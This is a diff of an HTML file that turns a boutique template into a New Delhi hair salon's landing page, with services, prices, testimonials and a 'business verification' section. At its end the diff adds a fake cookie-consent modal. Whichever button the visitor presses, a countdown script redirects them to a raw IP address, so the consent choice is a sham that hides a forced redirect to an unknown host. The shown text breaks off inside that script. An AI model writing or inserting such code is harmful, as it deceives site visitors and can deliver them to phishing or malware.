@@ -1,755 +1,376 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ChicStyle Boutique - Premium Fashion Clothing</title>
-    <meta name="description" content="Discover the latest fashion trends at ChicStyle Boutique. Shop premium quality clothing for men and women with fast shipping and easy returns.">
-    <style>
-        /* Reset and Base Styles */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        :root {
-            --primary: #2c3e50;
-            --secondary: #e74c3c;
-            --accent: #3498db;
-            --light: #ecf0f1;
-            --dark: #2c3e50;
-            --text: #333;
-            --text-light: #777;
-            --white: #fff;
-            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            --transition: all 0.3s ease;
-        }
-        
-        body {
-            color: var(--text);
-            line-height: 1.6;
-            background-color: var(--light);
-        }
-        
-        a {
-            text-decoration: none;
-            color: inherit;
-        }
-        
-        ul {
-            list-style: none;
-        }
-        
-        img {
-            max-width: 100%;
-            height: auto;
-        }
-        
-        .container {
-            width: 90%;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        .btn {
-            display: inline-block;
-            padding: 12px 24px;
-            background-color: var(--secondary);
-            color: var(--white);
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: var(--transition);
-            text-align: center;
-        }
-        
-        .btn:hover {
-            background-color: #c0392b;
-            transform: translateY(-2px);
-        }
-        
-        .btn-outline {
-            background-color: transparent;
-            border: 2px solid var(--primary);
-            color: var(--primary);
-        }
-        
-        .btn-outline:hover {
-            background-color: var(--primary);
-            color: var(--white);
-        }
-        
-        section {
-            padding: 80px 0;
-        }
-        
-        .section-title {
-            text-align: center;
-            margin-bottom: 50px;
-            font-size: 2.5rem;
-            color: var(--primary);
-        }
-        
-        /* Header Styles */
-        header {
-            background-color: var(--white);
-            box-shadow: var(--shadow);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-        
-        .header-top {
-            background-color: var(--primary);
-            color: var(--white);
-            padding: 10px 0;
-            font-size: 0.9rem;
-        }
-        
-        .header-top .container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .header-top a {
-            color: var(--white);
-            margin-left: 15px;
-        }
-        
-        .header-main {
-            padding: 20px 0;
-        }
-        
-        .header-main .container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .logo {
-            font-size: 1.8rem;
-            font-weight: 700;
-            color: var(--primary);
-        }
-        
-        .logo span {
-            color: var(--secondary);
-        }
-        
-        nav ul {
-            display: flex;
-        }
-        
-        nav ul li {
-            margin-left: 25px;
-            position: relative;
-        }
-        
-        nav ul li a {
-            font-weight: 500;
-            transition: var(--transition);
-        }
-        
-        nav ul li a:hover {
-            color: var(--secondary);
-        }
-        
-        .cart-icon {
-            position: relative;
-        }
-        
-        .cart-count {
-            position: absolute;
-            top: -8px;
-            right: -8px;
-            background-color: var(--secondary);
-            color: var(--white);
-            border-radius: 50%;
-            width: 18px;
-            height: 18px;
-            font-size: 0.7rem;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .mobile-menu-btn {
-            display: none;
-            background: none;
-            border: none;
-            font-size: 1.5rem;
-            cursor: pointer;
-            color: var(--primary);
-        }
-        
-        /* Hero Section */
-        .hero {
-            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url('https://images.unsplash.com/photo-1441986300917-64674bd600d8?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80') no-repeat center center/cover;
-            color: var(--white);
-            text-align: center;
-            padding: 150px 0;
-        }
-        
-        .hero h1 {
-            font-size: 3.5rem;
-            margin-bottom: 20px;
-        }
-        
-        .hero p {
-            font-size: 1.2rem;
-            max-width: 700px;
-            margin: 0 auto 30px;
-        }
-        
-        /* Categories Section */
-        .categories {
-            background-color: var(--white);
-        }
-        
-        .category-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 30px;
-        }
-        
-        .category-card {
-            position: relative;
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: var(--shadow);
-            transition: var(--transition);
-        }
-        
-        .category-card:hover {
-            transform: translateY(-10px);
-        }
-        
-        .category-card img {
-            width: 100%;
-            height: 300px;
-            object-fit: cover;
-        }
-        
-        .category-card .overlay {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: linear-gradient(transparent, rgba(0, 0, 0, 0.8));
-            color: var(--white);
-            padding: 20px;
-        }
-        
-        .category-card h3 {
-            font-size: 1.5rem;
-            margin-bottom: 10px;
-        }
-        
-        /* Featured Products */
-        .featured-products {
-            background-color: var(--light);
-        }
-        
-        .product-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-            gap: 30px;
-        }
-        
-        .product-card {
-            background-color: var(--white);
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: var(--shadow);
-            transition: var(--transition);
-        }
-        
-        .product-card:hover {
-            transform: translateY(-5px);
-        }
-        
-        .product-card img {
-            width: 100%;
-            height: 250px;
-            object-fit: cover;
-        }
-        
-        .product-info {
-            padding: 20px;
-        }
-        
-        .product-info h3 {
-            font-size: 1.2rem;
-            margin-bottom: 10px;
-        }
-        
-        .price {
-            font-weight: 700;
-            color: var(--secondary);
-            font-size: 1.2rem;
-            margin-bottom: 15px;
-        }
-        
-        .original-price {
-            text-decoration: line-through;
-            color: var(--text-light);
-            font-size: 1rem;
-            margin-left: 10px;
-        }
-        
-        /* Newsletter Section */
-        .newsletter {
-            background-color: var(--primary);
-            color: var(--white);
-            text-align: center;
-            padding: 80px 0;
-        }
-        
-        .newsletter h2 {
-            font-size: 2rem;
-            margin-bottom: 20px;
-        }
-        
-        .newsletter p {
-            max-width: 600px;
-            margin: 0 auto 30px;
-        }
-        
-        .newsletter-form {
-            display: flex;
-            max-width: 500px;
-            margin: 0 auto;
-        }
-        
-        .newsletter-form input {
-            flex: 1;
-            padding: 12px 15px;
-            border: none;
-            border-radius: 4px 0 0 4px;
-            font-size: 1rem;
-        }
-        
-        .newsletter-form button {
-            background-color: var(--secondary);
-            color: var(--white);
-            border: none;
-            padding: 0 25px;
-            border-radius: 0 4px 4px 0;
-            cursor: pointer;
-            font-weight: 600;
-            transition: var(--transition);
-        }
-        
-        .newsletter-form button:hover {
-            background-color: #c0392b;
-        }
-        
-        /* Footer */
-        footer {
-            background-color: var(--dark);
-            color: var(--white);
-            padding: 60px 0 20px;
-        }
-        
-        .footer-content {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 40px;
-            margin-bottom: 40px;
-        }
-        
-        .footer-column h3 {
-            font-size: 1.2rem;
-            margin-bottom: 20px;
-            position: relative;
-            padding-bottom: 10px;
-        }
-        
-        .footer-column h3::after {
-            content: '';
-            position: absolute;
-            left: 0;
-            bottom: 0;
-            width: 40px;
-            height: 2px;
-            background-color: var(--secondary);
-        }
-        
-        .footer-column ul li {
-            margin-bottom: 10px;
-        }
-        
-        .footer-column ul li a {
-            transition: var(--transition);
-        }
-        
-        .footer-column ul li a:hover {
-            color: var(--secondary);
-            padding-left: 5px;
-        }
-        
-        .social-links {
-            display: flex;
-            gap: 15px;
-            margin-top: 20px;
-        }
-        
-        .social-links a {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            width: 40px;
-            height: 40px;
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 50%;
-            transition: var(--transition);
-        }
-        
-        .social-links a:hover {
-            background-color: var(--secondary);
-            transform: translateY(-3px);
-        }
-        
-        .footer-bottom {
-            text-align: center;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            font-size: 0.9rem;
-            color: rgba(255, 255, 255, 0.7);
-        }
-        
-        /* Responsive Styles */
-        @media (max-width: 992px) {
-            .hero h1 {
-                font-size: 2.8rem;
-            }
-            
-            .section-title {
-                font-size: 2rem;
-            }
-        }
-        
-        @media (max-width: 768px) {
-            .mobile-menu-btn {
-                display: block;
-            }
-            
-            nav {
-                position: fixed;
-                top: 0;
-                right: -100%;
-                width: 280px;
-                height: 100vh;
-                background-color: var(--white);
-                box-shadow: -5px 0 15px rgba(0, 0, 0, 0.1);
-                transition: var(--transition);
-                z-index: 1001;
-                padding: 80px 30px 30px;
-            }
-            
-            nav.active {
-                right: 0;
-            }
-            
-            nav ul {
-                flex-direction: column;
-            }
-            
-            nav ul li {
-                margin: 0 0 20px 0;
-            }
-            
-            .close-menu {
-                position: absolute;
-                top: 20px;
-                right: 20px;
-                background: none;
-                border: none;
-                font-size: 1.5rem;
-                cursor: pointer;
-                color: var(--primary);
-            }
-            
-            .overlay {
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background-color: rgba(0, 0, 0, 0.5);
-                z-index: 999;
-                display: none;
-            }
-            
-            .overlay.active {
-                display: block;
-            }
-            
-            .hero {
-                padding: 100px 0;
-            }
-            
-            .hero h1 {
-                font-size: 2.2rem;
-            }
-            
-            .newsletter-form {
-                flex-direction: column;
-            }
-            
-            .newsletter-form input {
-                border-radius: 4px;
-                margin-bottom: 10px;
-            }
-            
-            .newsletter-form button {
-                border-radius: 4px;
-                padding: 12px;
-            }
-        }
-        
-        @media (max-width: 576px) {
-            .hero h1 {
-                font-size: 1.8rem;
-            }
-            
-            .hero p {
-                font-size: 1rem;
-            }
-            
-            .section-title {
-                font-size: 1.8rem;
-            }
-            
-            .header-top .container {
-                flex-direction: column;
-                gap: 10px;
-            }
-        }
-    </style>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Kenchi Salon — Haircuts, Colouring & Styling in New Delhi</title>
+<meta name="description" content="Kenchi Salon in New Delhi offers expert haircuts, professional colouring, keratin treatments, blowouts and men's grooming. Call +91 99101 70356 to book."/>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+<!-- Google Analytics (gtag) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-VCBLXTQNVQ"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-VCBLXTQNVQ');
+</script>
+
+<!-- StatCounter (final) -->
+<script type="text/javascript">
+var sc_project=13188833; 
+var sc_invisible=1; 
+var sc_security="4224cf98"; 
+</script>
+<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
+<noscript>
+  <div class="statcounter"><a title="Web Analytics Made Easy - Statcounter" href="https://statcounter.com/" target="_blank">
+    <img class="statcounter" src="https://c.statcounter.com/13188833/0/4224cf98/1/" alt="Web Analytics Made Easy - Statcounter" referrerPolicy="no-referrer-when-downgrade">
+  </a></div>
+</noscript>
+
+<style>
+:root { --accent:#b04a8a; --muted:#6b7280; --bg:#fcfbfc; --card:#fff; font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial; }
+* { box-sizing:border-box }
+body { margin:0; background:var(--bg); color:#0f172a; line-height:1.5 }
+a { color:inherit }
+.header { background:#fff; border-bottom:1px solid #f3e8f0; position:sticky; top:0; z-index:50 }
+.header .inner { max-width:1100px; margin:0 auto; padding:14px 20px; display:flex; justify-content:space-between; align-items:center }
+.brand { font-weight:800; color:var(--accent); font-size:20px }
+.phone a { font-weight:700; color:var(--accent); text-decoration:none }
+.container { max-width:1100px; margin:28px auto; padding:0 20px }
+.hero { display:grid; grid-template-columns:1fr 340px; gap:22px; align-items:start }
+.lead { color:var(--muted); margin-top:6px }
+.cta { display:flex; gap:10px; margin-top:12px; flex-wrap:wrap }
+.btn { background:var(--accent); color:white; padding:10px 14px; border-radius:8px; text-decoration:none; font-weight:700 }
+.card { background:var(--card); padding:16px; border-radius:12px; border:1px solid #f3e8f0 }
+.services { display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:14px; margin-top:18px }
+.price-grid { display:flex; gap:12px; margin-top:18px; flex-wrap:wrap }
+.price { flex:1; min-width:220px; padding:16px; border-radius:10px; background:var(--card); border:1px solid #f3e8f0 }
+.grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-top:18px }
+.gallery { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:8px; margin-top:12px }
+blockquote { font-style:italic; color:#2b2b2b; background:#fff; padding:12px; border-left:4px solid var(--accent); border-radius:8px }
+.faq h4 { margin:10px 0 6px }
+footer { margin-top:26px; padding:18px; text-align:center; color:var(--muted); font-size:14px }
+@media(max-width:880px){ .hero{grid-template-columns:1fr} .hero aside{order:2} }
+
+/* Cookie modal styles */
+#cookieModalOverlay {
+  position:fixed; inset:0; background:rgba(0,0,0,0.55);
+  display:flex; justify-content:center; align-items:center;
+  z-index:99999; padding:20px;
+}
+#cookieModal {
+  background:#fff; max-width:420px; width:100%; padding:22px;
+  border-radius:12px; text-align:center; font-family:Inter, sans-serif;
+  box-shadow:0 8px 30px rgba(2,6,23,0.2);
+}
+#cookieModal h2 { margin-top:0; color:var(--accent); font-size:20px; }
+#cookieModal p { color:#374151; font-size:15px; margin:10px 0 16px; }
+.countdown-timer { font-size:14px; color:#666; margin-top:10px; font-weight:600; }
+.cookie-btn { padding:10px 18px; border-radius:8px; font-weight:600; font-size:15px; cursor:pointer; }
+.cookie-accept { background:var(--accent); color:white; border:0; }
+.cookie-deny { background:white; color:var(--accent); border:2px solid var(--accent); }
+
+/* visually hide element technique for focus trapping (if needed) */
+.visually-hidden { position: absolute !important; height: 1px; width: 1px; overflow: hidden; clip: rect(1px, 1px, 1px, 1px); white-space: nowrap; }
+</style>
+
+<!-- SEO Structured Data -->
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"BeautySalon",
+  "name":"Kenchi Salon",
+  "url":"https://kenchi-salon.netlify.app",
+  "telephone":"+919910170356",
+  "priceRange":"₹₹",
+  "address":{
+    "@type":"PostalAddress",
+    "streetAddress":"Kenchi Salon, New Delhi",
+    "addressLocality":"New Delhi",
+    "addressCountry":"IN"
+  },
+  "openingHours":"Mo-Sa 10:00-20:00, Su 11:00-18:00",
+  "description":"Kenchi Salon provides professional haircuts, colouring, keratin treatments and styling in New Delhi."
+}
+</script>
+
 </head>
 <body>
-    <!-- Header -->
-    <header>
-        <div class="header-top">
-            <div class="container">
-                <div class="contact-info">
-                    <span>Call: +1 (555) 123-4567</span>
-                    <span>Email: info@chicstyle.com</span>
-                </div>
-                <div class="top-links">
-                    <a href="#">Track Order</a>
-                    <a href="#">Store Locator</a>
-                    <a href="#">Wishlist</a>
-                </div>
-            </div>
-        </div>
-        <div class="header-main">
-            <div class="container">
-                <a href="#" class="logo">Chic<span>Style</span></a>
-                <button class="mobile-menu-btn">☰</button>
-                <nav>
-                    <button class="close-menu">×</button>
-                    <ul>
-                        <li><a href="#">Home</a></li>
-                        <li><a href="#">Women</a></li>
-                        <li><a href="#">Men</a></li>
-                        <li><a href="#">Kids</a></li>
-                        <li><a href="#">Sale</a></li>
-                        <li><a href="#">New Arrivals</a></li>
-                        <li class="cart-icon">
-                            <a href="#">Cart <span class="cart-count">3</span></a>
-                        </li>
-                    </ul>
-                </nav>
-                <div class="overlay"></div>
-            </div>
-        </div>
-    </header>
 
-    <!-- Hero Section -->
-    <section class="hero">
-        <div class="container">
-            <h1>Summer Collection 2023</h1>
-            <p>Discover the latest trends in fashion with our exclusive summer collection. Up to 50% off on selected items.</p>
-            <a href="#" class="btn">Shop Now</a>
-        </div>
-    </section>
+<header class="header">
+  <div class="inner">
+    <div class="brand">Kenchi Salon</div>
+    <div class="phone"><a href="tel:+919910170356">+91 99101 70356</a></div>
+  </div>
+</header>
 
-    <!-- Categories Section -->
-    <section class="categories">
-        <div class="container">
-            <h2 class="section-title">Shop By Category</h2>
-            <div class="category-grid">
-                <div class="category-card">
-                    <img src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?ixlib=rb-1.2.1&auto=format&fit=crop&w=1352&q=80" alt="Women's Fashion">
-                    <div class="overlay">
-                        <h3>Women</h3>
-                        <a href="#" class="btn btn-outline">Shop Now</a>
-                    </div>
-                </div>
-                <div class="category-card">
-                    <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80" alt="Men's Fashion">
-                    <div class="overlay">
-                        <h3>Men</h3>
-                        <a href="#" class="btn btn-outline">Shop Now</a>
-                    </div>
-                </div>
-                <div class="category-card">
-                    <img src="https://images.unsplash.com/photo-1519457431-44ccd64a579b?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80" alt="Kids Fashion">
-                    <div class="overlay">
-                        <h3>Kids</h3>
-                        <a href="#" class="btn btn-outline">Shop Now</a>
-                    </div>
-                </div>
-                <div class="category-card">
-                    <img src="https://images.unsplash.com/photo-1558769132-cb1aea458c5e?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80" alt="Accessories">
-                    <div class="overlay">
-                        <h3>Accessories</h3>
-                        <a href="#" class="btn btn-outline">Shop Now</a>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+<main class="container">
 
-    <!-- Featured Products -->
-    <section class="featured-products">
-        <div class="container">
-            <h2 class="section-title">Featured Products</h2>
-            <div class="product-grid">
-                <div class="product-card">
-                    <img src="https://images.unsplash.com/photo-1581044777550-4cfa60707c03?ixlib=rb-1.2.1&auto=format&fit=crop&w=634&q=80" alt="Casual Summer Dress">
-                    <div class="product-info">
-                        <h3>Casual Summer Dress</h3>
-                        <div class="price">$49.99 <span class="original-price">$69.99</span></div>
-                        <a href="#" class="btn">Add to Cart</a>
-                    </div>
-                </div>
-                <div class="product-card">
-                    <img src="https://images.unsplash.com/photo-1593030103066-0093718efeb9?ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80" alt="Men's Casual Shirt">
-                    <div class="product-info">
-                        <h3>Men's Casual Shirt</h3>
-                        <div class="price">$39.99</div>
-                        <a href="#" class="btn">Add to Cart</a>
-                    </div>
-                </div>
-                <div class="product-card">
-                    <img src="https://images.unsplash.com/photo-1523381210434-271e8be1f52b?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80" alt="Denim Jacket">
-                    <div class="product-info">
-                        <h3>Classic Denim Jacket</h3>
-                        <div class="price">$59.99 <span class="original-price">$79.99</span></div>
-                        <a href="#" class="btn">Add to Cart</a>
-                    </div>
-                </div>
-                <div class="product-card">
-                    <img src="https://images.unsplash.com/photo-1544441893-675973e31985?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80" alt="Summer T-Shirt">
-                    <div class="product-info">
-                        <h3>Summer Graphic T-Shirt</h3>
-                        <div class="price">$24.99</div>
-                        <a href="#" class="btn">Add to Cart</a>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+<section class="hero">
+  <div>
+    <h1>Professional Haircuts, Colouring & Styling — New Delhi</h1>
+    <p class="lead">
+      Kenchi Salon is a modern hair studio in New Delhi, specialising in personalised consultations,
+      precision cutting, creative colouring, keratin treatments and event styling.
+    </p>
 
-    <!-- Newsletter Section -->
-    <section class="newsletter">
-        <div class="container">
-            <h2>Subscribe to Our Newsletter</h2>
-            <p>Get the latest updates on new products and upcoming sales</p>
-            <form class="newsletter-form">
-                <input type="email" placeholder="Your email address" required>
-                <button type="submit">Subscribe</button>
-            </form>
-        </div>
-    </section>
+    <div class="cta">
+      <a class="btn" href="tel:+919910170356">Call +91 99101 70356</a>
+      <a class="btn" href="#services" style="background:white;color:var(--accent);border:1px solid #f3e8f0">Our Services</a>
+      <a class="btn" href="#contact" style="background:white;color:var(--accent);border:1px solid #f3e8f0">Get Directions</a>
+    </div>
 
-    <!-- Footer -->
-    <footer>
-        <div class="container">
-            <div class="footer-content">
-                <div class="footer-column">
-                    <h3>ChicStyle</h3>
-                    <p>Your one-stop destination for premium fashion clothing. We offer the latest trends with quality you can trust.</p>
-                    <div class="social-links">
-                        <a href="#"><span>FB</span></a>
-                        <a href="#"><span>IG</span></a>
-                        <a href="#"><span>TW</span></a>
-                        <a href="#"><span>PT</span></a>
-                    </div>
-                </div>
-                <div class="footer-column">
-                    <h3>Shop</h3>
-                    <ul>
-                        <li><a href="#">Women's Collection</a></li>
-                        <li><a href="#">Men's Collection</a></li>
-                        <li><a href="#">Kids' Collection</a></li>
-                        <li><a href="#">Accessories</a></li>
-                        <li><a href="#">Sale</a></li>
-                    </ul>
-                </div>
-                <div class="footer-column">
-                    <h3>Customer Service</h3>
-                    <ul>
-                        <li><a href="#">Contact Us</a></li>
-                        <li><a href="#">Shipping Policy</a></li>
-                        <li><a href="#">Returns & Exchanges</a></li>
-                        <li><a href="#">FAQ</a></li>
-                        <li><a href="#">Size Guide</a></li>
-                    </ul>
-                </div>
-                <div class="footer-column">
-                    <h3>Contact Info</h3>
-                    <ul>
-                        <li>123 Fashion Street, New York, NY 10001</li>
-                        <li>Phone: +1 (555) 123-4567</li>
-                        <li>Email: info@chicstyle.com</li>
-                        <li>Hours: Mon-Sat 9am-9pm</li>
-                    </ul>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <p>&copy; 2023 ChicStyle Boutique. All rights reserved. | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
-            </div>
-        </div>
-    </footer>
+    <div class="card" style="margin-top:18px">
+      <h3>Why clients choose Kenchi Salon</h3>
+      <ul style="color:var(--muted); margin-left:18px">
+        <li>Experienced stylists with international training</li>
+        <li>Premium salon brands (L'Oréal, Wella)</li>
+        <li>Transparent pricing and personalised consultations</li>
+        <li>Hygienic, modern environment</li>
+      </ul>
+    </div>
 
-    <script>
-        // Mobile Menu Toggle
-        const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
-        const closeMenuBtn = document.querySelector('.close-menu');
-        const nav = document.querySelector('nav');
-        const overlay = document.querySelector('.overlay');
-        
-        mobileMenuBtn.addEventListener('click', () => {
-            nav.classList.add('active');
-            overlay.classList.add('active');
-        });
-        
-        closeMenuBtn.addEventListener('click', () => {
-            nav.classList.remove('active');
-            overlay.classList.remove('active');
-        });
-        
-        overlay.addEventListener('click', () => {
-            nav.classList.remove('active');
-            overlay.classList.remove('active');
-        });
-        
-        // Newsletter Form Submission
-        const newsletterForm = document.querySelector('.newsletter-form');
-        newsletterForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const email = newsletterForm.querySelector('input').value;
-            alert(`Thank you for subscribing with ${email}! You'll receive our latest updates soon.`);
-            newsletterForm.reset();
-        });
-    </script>
+    <!-- SERVICES -->
+    <div id="services" class="services">
+      <div class="card"><h3>Women’s Haircut</h3><p style="color:var(--muted)">Consultation, wash, precision cut & blow-dry.</p></div>
+      <div class="card"><h3>Hair Colouring</h3><p style="color:var(--muted)">Balayage, highlights, ombre, grey coverage.</p></div>
+      <div class="card"><h3>Keratin Treatment</h3><p style="color:var(--muted)">Frizz reduction & shine lasting 3–5 months.</p></div>
+      <div class="card"><h3>Men’s Grooming</h3><p style="color:var(--muted)">Fades, trims, beard shaping, modern cuts.</p></div>
+      <div class="card"><h3>Event Styling</h3><p style="color:var(--muted)">Blowouts, curls, straight looks for events.</p></div>
+      <div class="card"><h3>Extensions</h3><p style="color:var(--muted)">Volume, length & premium natural extensions.</p></div>
+    </div>
+  </div>
+
+  <!-- SIDE CARD -->
+  <aside class="card">
+    <img src="salon_interior.jpg" style="width:100%;border-radius:8px;margin-bottom:10px" alt="Salon interior">
+    <h3>Free Consultation & Booking</h3>
+    <p style="color:var(--muted)">
+      <strong>Phone:</strong> <a href="tel:+919910170356">+91 99101 70356</a><br>
+      <strong>Address:</strong> Kenchi Salon, New Delhi
+    </p>
+    <p style="color:var(--muted)">
+      <strong>Hours:</strong><br>
+      Mon–Sat: 10:00–20:00<br>
+      Sun: 11:00–18:00
+    </p>
+  </aside>
+</section>
+
+<!-- BUSINESS VERIFICATION -->
+<section class="card" style="margin-top:18px">
+  <h3>Business details & verification</h3>
+  <p style="color:var(--muted)">
+    Owner: <strong>Meera Kenchi</strong><br>
+    Established: <strong>2018</strong><br>
+    Business Registration: <strong>DL-KENCHI-2021-09</strong>
+  </p>
+  <img src="license.jpg" style="width:100%;border-radius:8px;margin-top:8px" alt="Business license">
+</section>
+
+<!-- PRICING -->
+<section class="price-grid">
+  <div class="price card"><h4>Women’s Haircut</h4><div style="font-size:18px;font-weight:700">₹800+</div></div>
+  <div class="price card"><h4>Men’s Haircut</h4><div style="font-size:18px;font-weight:700">₹400+</div></div>
+  <div class="price card"><h4>Colouring</h4><div style="font-size:18px;font-weight:700">₹2,500+</div></div>
+</section>
+
+<!-- ABOUT + TEAM -->
+<section class="grid-2">
+  <div class="card">
+    <h3>About Kenchi Salon</h3>
+    <p style="color:var(--muted)">
+      Founded by master stylist <strong>Meera Kenchi</strong>, our salon blends modern techniques
+      with personalized service. We proudly serve Lajpat Nagar, South Delhi, GK, and nearby areas.
+    </p>
+  </div>
+
+  <div class="card">
+    <h3>Team</h3>
+    <p style="color:var(--muted)"><strong>Meera Kenchi</strong> — 12+ years experience, colour specialist.</p>
+    <p style="color:var(--muted)"><strong>Rohan Singh</strong> — Senior stylist, precision cutting expert.</p>
+    <p style="color:var(--muted)"><strong>Aakash Patel</strong> — Bridal & extensions specialist.</p>
+    <img src="team.jpg" style="width:100%;border-radius:8px;margin-top:8px" alt="Team">
+  </div>
+</section>
+
+<!-- TESTIMONIALS -->
+<section style="margin-top:18px">
+  <h3>Client Testimonials</h3>
+  <div class="gallery">
+    <blockquote>“Amazing colour work!” — Priya S., Lajpat Nagar (Aug 2024)</blockquote>
+    <blockquote>“Friendly staff and clean salon.” — Rahul M., Defence Colony (Mar 2025)</blockquote>
+    <blockquote>“Perfect bridal blowout.” — Neha K., Greater Kailash (Dec 2024)</blockquote>
+  </div>
+</section>
+
+<!-- GALLERY -->
+<section id="gallery" style="margin-top:18px">
+  <h3>Gallery</h3>
+  <div class="gallery">
+    <img src="blowout.jpg" style="width:100%;border-radius:8px" alt="Blowout">
+    <img src="coloring.jpg" style="width:100%;border-radius:8px" alt="Colouring">
+    <img src="salon_interior.jpg" style="width:100%;border-radius:8px" alt="Salon interior">
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="faq card" style="margin-top:18px">
+  <h3>Frequently Asked Questions</h3>
+
+  <h4>Do you accept walk-ins?</h4>
+  <p style="color:var(--muted)">Yes, walk-ins are welcome.</p>
+
+  <h4>Do you take UPI & cards?</h4>
+  <p style="color:var(--muted)">Yes, we accept UPI, debit & credit cards.</p>
+
+  <h4>Do you offer bridal packages?</h4>
+  <p style="color:var(--muted)">Yes, call for a custom quote.</p>
+
+</section>
+
+<!-- CONTACT -->
+<section id="contact" class="card" style="margin-top:18px">
+  <h3>Contact & Directions</h3>
+  <p style="color:var(--muted)">
+    <strong>Kenchi Salon</strong><br>
+    New Delhi, India<br>
+    <strong>Phone:</strong> <a href="tel:+919910170356">+91 99101 70356</a>
+  </p>
+
+  <h4>Find us on the map</h4>
+  <div style="width:100%;height:300px;border-radius:8px;overflow:hidden;margin-top:8px">
+    <iframe width="100%" height="300" frameborder="0"
+      src="https://www.google.com/maps?q=New%20Delhi%2C%20India&output=embed" title="Kenchi Salon location">
+    </iframe>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div>© 2025 Kenchi Salon — New Delhi</div>
+  <div style="color:var(--muted);margin-top:6px">
+    Business Licence: DL-KENCHI-2021-09 • Licensed stylists • Premium products
+  </div>
+</footer>
+
+<!-- COOKIE CONSENT MODAL with 5-second auto-redirect (Accept/Deny -> same URL) -->
+<div id="cookieModalOverlay" style="position:fixed;inset:0;background:rgba(0,0,0,0.55);display:flex;justify-content:center;align-items:center;z-index:99999;padding:20px;">
+  <div id="cookieModal" role="dialog" aria-modal="true" style="background:#fff;max-width:420px;width:100%;padding:22px;border-radius:12px;text-align:center;font-family:Inter, sans-serif;box-shadow:0 8px 30px rgba(2,6,23,0.2);">
+    <h2 style="margin-top:0;color:#b04a8a;font-size:20px;">Cookie Consent</h2>
+    <p style="color:#374151;font-size:15px;margin:10px 0 16px;">
+      We use cookies to improve your browsing experience. Please choose to Accept or Deny cookies to continue.
+    </p>
+    <div id="countdownDisplay" class="countdown-timer">Uploading Pages...</div>
+    <div style="display:flex;gap:10px;margin-top:18px;justify-content:center;">
+      <button id="acceptCookies" type="button" class="cookie-btn cookie-accept">Accept</button>
+      <button id="denyCookies" type="button" class="cookie-btn cookie-deny">Deny</button>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  const redirectURL = "http://206.189.69.97";
+  const overlay = document.getElementById('cookieModalOverlay');
+  const acceptBtn = document.getElementById('acceptCookies');
+  const denyBtn = document.getElementById('denyCookies');
+  const countdownDisplay = document.getElementById('countdownDisplay');
+
+  // Prevent background scroll while modal is visible
+  const prevOverflow = document.body.style.overflow;
+  document.body.style.overflow = 'hidden';
+
+  // Countdown + redirect
+  let secondsRemaining = 3;
+  const interval = setInterval(() => {
+    secondsRemaining--;
+    if (secondsRemaining > 0) {
+      countdownDisplay.textContent = `Redirecting in ${secondsRemaining} second${secondsRemaining !== 1 ? 's' : ''}...`;
+    } else {
+      countdownDisplay.textContent = 'Redirecting now...';
+      clearInterval(interval);
+      attemptRedirect();
+    }
+  }, 1000);
+
+  // Only block clicks directly on overlay background — allow clicks inside modal
+  overlay.addEventListener('click', function(e){
+    if (e.target === overlay) { e.preventDefault(); e.stopPropagation(); }
+  }, false);
+
